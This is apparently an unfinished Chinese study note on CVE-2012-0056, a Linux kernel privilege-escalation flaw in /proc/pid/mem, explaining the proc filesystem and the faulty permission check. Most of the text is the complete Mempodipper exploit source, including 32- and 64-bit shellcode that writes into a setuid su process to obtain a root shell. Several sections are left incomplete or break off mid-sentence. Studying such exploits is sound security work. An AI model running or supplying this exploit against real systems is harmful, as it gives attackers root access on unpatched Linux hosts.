## 1、漏洞描述

Linux kernel 3.2.2之前版本，进程

## 2、相关知识

### 2.1 proc文件系统

&ensp;&ensp;&ensp;&ensp;/proc是一种伪文件系统（虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件。它为内核数据结构提供接口。

用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以更改其中某些文件来改变内核的运行状态。

&ensp;&ensp;&ensp;&ensp;大多数虚拟文件都可以使用文件查看命令如cat，more，less等进行查看。这些文件根剧特性存储在不同的目录。如/proc/scsi目录存储的是当前系统上所有scsi设备的有关信息，/proc/N 目录中存储的则是系统当前正在运行的进程有关信息。（N表示进程号）

![img](C:\Users\mi\Desktop\业务\CVE\CVE-2012-0056\photo\1.jpg)

| 常见目录    | 含义                                                         |
| ----------- | ------------------------------------------------------------ |
| misc        | 杂项                                                         |
| cmdline     | 系统启动时，输入给内核命令行数                               |
| cpuinfo     | cpu的硬件信息（架构，缓存大小等）                            |
| devices     | 主设备号及设备组的列表，当前加载的各种设备（块设备/字符设备） |
| dma         | 使用的dma通道                                                |
| filesystems | 当前内核支持的文件系统                                       |
| kmsg        | 记录的内核日志信息                                           |
| kallsym     | 内核符号表，该文件保存了内核输出的符号定义                   |
| locks       | 内核锁                                                       |
| meminfo     | 物理内存，交换空间等的信息                                   |
| modules     | 已经加载的模块列表，对应lsmod命令                            |
| mounts      | 已加载的文件系统的列表，对应mount命令，无参数                |
| stat        | 全面统计状态表，cpu内存的利用率都是从这里面提取数据          |
| partitions  | 系统识别的分区表                                             |

/proc/pid目录下的重要文件

| 目录              | 含义                               |
| ----------------- | ---------------------------------- |
| /proc/pid/cmdline | 用于开始进程的命令                 |
| /proc/pid/cwd     | 当前进程的工作目录                 |
| /proc/pid/environ | 可用进程环境变量列表               |
| /proc/pid/exe     | 包含正在进程中运行的程序连接       |
| /proc/pid/fd      | 目录包含进程打开的每一个文件的链接 |
| /proc/pid/mem     | 包含了进程在内存中的内容           |
| /proc/pid/stat    | 包含了进程的状态信息               |
| /proc/pid/statm   | 包含了进程的内存使用信息           |

### 2.2 /proc/pid/mem与/proc/pid/maps

/proc/pid/maps： 显示了进程映射的内存区域和访问权限。

![image-20230212185025974](C:\Users\mi\AppData\Roaming\Typora\typora-user-images\image-20230212185025974.png)

上图就是可执行程序执行时对应的内存映射布局。

/proc/pid/mem ：此文件用于访问进程内存的页面，如open()，read()，lseek()

其显示pid的内存内容映射方式与进程相同，即伪文件中偏移量X处的字节与进程中地址X地址处的字节相同。

如果操作、你需要以root身份运行此脚本，否则你将无法读取或写入/proc/pid/mem文件，即使你是该进程的所有

## 3. 漏洞原理分析

### mem读写权限检测

环境使用2.6.39

mem是proc目录下的节点，读写需要关注/mem的file_operation权限。路径"fs/proc/base.c"

![image-20230212212215073](C:\Users\mi\Desktop\业务\CVE\CVE-2012-0056\photo\2.png)

**第一步：查看mem_open**

![image-20230212212315548](C:\Users\mi\Desktop\业务\CVE\CVE-2012-0056\photo\3.png)

file—>private_data是什么？

它是Linux下连接VFS文件系统框架和不同文件/文件系统底层实现之间的一个核心数据结构，是struct file结构体中一个重要的成员变量。

open 系统调用设置这个指针为 NULL, 在为驱动调用 open 方法之前. 你可自由使用这个成员或者忽略它; 你可以使用这个成员来指向分配的数据, 但是接着你必须记住在内核销毁文件结构之前, 在 release 方法中释放那个内存. private_data 是一个有用的资源, 在系统调用间保留状态信息, 我们大部分例子模块都使用它。

这个private_data 其实是用来保存自定义设备结构体的地址的。自定义结构体的地址被保存在private_data后，可以在read ,write 等驱动函数中被传递和调用自定义设备结构体中的成员

current—>self_exec_id是什么？



/proc/pid/mem是一个接口，进程可以通过对/proc文件的"/proc/pid/mem"(进程的内存镜像)执行open()，write()操作，进而来读写自身的所有内存。但由于对写操作的权限检查不严谨，可以被绕过，攻击者可以利用该漏洞进行本地提权。

proc文件中的/proc/pid/mem是pid进程的一份内存镜像，可以通过它来读写进程的所有内存，包括可执行代码。2.6.39版本之前，这份内存镜像是不可写的，后来取消了。对/proc/pid/mem文件的操作是有限制的，比如pid进程自己可以写自己的/proc/pid/mem文件，或者调试进程写被调试的进程。

而攻击者的思想就是当执行suid程序时，会有输出。对于某些 程序，输出的内容正好包括有传递的参数。换句话说程序既然能输出攻击者输入的信息，则说明输入的信息已经改写到内存中了。

如果将suid程序的stderr重定向到自己的/proc/pid/mem,自己修改自己是完全可行的。

![image-20230212222658878](C:\Users\mi\Desktop\业务\CVE\CVE-2012-0056\photo\4.png)

## poc

```c
/*
Exploit code is here: http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
Blog post about it is here: http://blog.zx2c4.com/749
EDB-Note: Updated version can be found here: https://www.exploit-db.com/exploits/35161/

# Exploit Title: Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64-bit
# Date: Jan 21, 2012
# Author: zx2c4
# Tested on: Gentoo, Ubuntu
# Platform: Linux
# Category: Local
# CVE-2012-0056


 * Mempodipper
 * by zx2c4
 * 
 * Linux Local Root Exploit
 * 
 * Rather than put my write up here, per usual, this time I've put it
 * in a rather lengthy blog post: http://blog.zx2c4.com/749
 * 
 * Enjoy.
 * 
 * - zx2c4
 * Jan 21, 2012
 * 
 * CVE-2012-0056
 */

#define _LARGEFILE64_SOURCE 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <fcntl.h>
#include <unistd.h>
#include <limits.h>

char *socket_path = "/tmp/.sockpuppet";
int send_fd(int fd)
{
	char buf[1];
	struct iovec iov;
	struct msghdr msg;
	struct cmsghdr *cmsg;
	struct sockaddr_un addr;
	int n;
	int sock;
	char cms[CMSG_SPACE(sizeof(int))];
	
	if ((sock = socket(AF_UNIX, SOCK_STREAM, 0)) < 0)
		return -1;
	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
	if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
		return -1;

	buf[0] = 0;
	iov.iov_base = buf;
	iov.iov_len = 1;

	memset(&msg, 0, sizeof msg);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = (caddr_t)cms;
	msg.msg_controllen = CMSG_LEN(sizeof(int));

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	memmove(CMSG_DATA(cmsg), &fd, sizeof(int));

	if ((n = sendmsg(sock, &msg, 0)) != iov.iov_len)
		return -1;
	close(sock);
	return 0;
}

int recv_fd()
{
	int listener;
	int sock;
	int n;
	int fd;
	char buf[1];
	struct iovec iov;
	struct msghdr msg;
	struct cmsghdr *cmsg;
	struct sockaddr_un addr;
	char cms[CMSG_SPACE(sizeof(int))];

	if ((listener = socket(AF_UNIX, SOCK_STREAM, 0)) < 0)
		return -1;
	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, socket_path, sizeof(addr.sun_path) - 1);
	unlink(socket_path);
	if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) < 0)
		return -1;
	if (listen(listener, 1) < 0)
		return -1;
	if ((sock = accept(listener, NULL, NULL)) < 0)
		return -1;
	
	iov.iov_base = buf;
	iov.iov_len = 1;

	memset(&msg, 0, sizeof msg);
	msg.msg_name = 0;
	msg.msg_namelen = 0;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	msg.msg_control = (caddr_t)cms;
	msg.msg_controllen = sizeof cms;

	if ((n = recvmsg(sock, &msg, 0)) < 0)
		return -1;
	if (n == 0)
		return -1;
	cmsg = CMSG_FIRSTHDR(&msg);
	memmove(&fd, CMSG_DATA(cmsg), sizeof(int));
	close(sock);
	close(listener);
	return fd;
}

int main(int argc, char **argv)
{
	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
		char parent_mem[256];
		sprintf(parent_mem, "/proc/%s/mem", argv[2]);
		printf("[+] Opening parent mem %s in child.\n", parent_mem);
		int fd = open(parent_mem, O_RDWR);
		if (fd < 0) {
			perror("[-] open");
			return 1;
		}
		printf("[+] Sending fd %d to parent.\n", fd);
		send_fd(fd);
		return 0;
	}
	
	printf("===============================\n");
	printf("=          Mempodipper        =\n");
	printf("=           by zx2c4          =\n");
	printf("=         Jan 21, 2012        =\n");
	printf("===============================\n\n");
	
	int parent_pid = getpid();
	if (fork()) {
		printf("[+] Waiting for transferred fd in parent.\n");
		int fd = recv_fd();
		printf("[+] Received fd at %d.\n", fd);
		if (fd < 0) {
			perror("[-] recv_fd");
			return -1;
		}
		printf("[+] Assigning fd %d to stderr.\n", fd);
		dup2(2, 6);
		dup2(fd, 2);

		unsigned long address;
		if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'o')
			address = strtoul(argv[2], NULL, 16);
		else {
			printf("[+] Reading su for exit@plt.\n");
			// Poor man's auto-detection. Do this in memory instead of relying on objdump being installed.
			FILE *command = popen("objdump -d /bin/su|grep 'exit@plt'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
			char result[32];
			result[0] = 0;
			fgets(result, 32, command);
			pclose(command);
			address = strtoul(result, NULL, 16);
			if (address == ULONG_MAX || !address) {
				printf("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
				printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", argv[0], argv[0]);
				return 1;
			}
			printf("[+] Resolved exit@plt to 0x%lx.\n", address);
		}
		printf("[+] Calculating su padding.\n");
		FILE *command = popen("su this-user-does-not-exist 2>&1", "r");
		char result[256];
		result[0] = 0;
		fgets(result, 256, command);
		pclose(command);
		unsigned long su_padding = (strstr(result, "this-user-does-not-exist") - result) / sizeof(char);
		unsigned long offset = address - su_padding;
		printf("[+] Seeking to offset 0x%lx.\n", offset);
		lseek64(fd, offset, SEEK_SET);
		
#if defined(__i386__)
		// See shellcode-32.s in this package for the source.
		char shellcode[] =
			"\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\x31\xc9\xb3"
			"\x06\xb1\x02\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68"
			"\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\x66\xba\x2d\x69\x52\x89"
			"\xe0\x31\xd2\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd"
			"\x80";
#elif defined(__x86_64__)
		// See shellcode-64.s in this package for the source.
		char shellcode[] =
			"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xff\xb0\x6a\x0f\x05\x40"
			"\xb7\x06\x40\xb6\x02\xb0\x21\x0f\x05\x48\xbb\x2f\x2f\x62\x69"
			"\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xdb"
			"\x66\xbb\x2d\x69\x53\x48\x89\xe1\x48\x31\xc0\x50\x51\x57\x48"
			"\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05";

#else
#error "That platform is not supported."
#endif
		printf("[+] Executing su with shellcode.\n");
		execl("/bin/su", "su", shellcode, NULL);
	} else {
		char pid[32];
		sprintf(pid, "%d", parent_pid);
		printf("[+] Executing child from child fork.\n");
		execl("/proc/self/exe", argv[0], "-c", pid, NULL);
	}
}
```







- 通过什么方式完成了提权、

​       利用/proc/self/mem提权，通过执行带有suid权限标志位的二进制程序，通过/proc/self/mem写自己的内存。比如su程序，其有一个标准错误的输出，利用其执行shellcode提权。

- 是否存在有校验，如何绕过校验（漏洞点）

## 参考链接

[proc文件系统](https://www.cnblogs.com/cute/archive/2011/04/20/2022280.html)

[CVE-2012-0056 分析笔记](https://m4p1e.com/2019/11/03/CVE-2012-0056/)

[记一个linux内核内存提权问题](https://blog.csdn.net/ctthuangcheng/article/details/8916078)

[Linux内核提权漏洞系列简要分析之CVE-2012-0056](http://www.h4ckn1ght.com/blog/2015/07/15/Linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90-CVE-2012-0056/)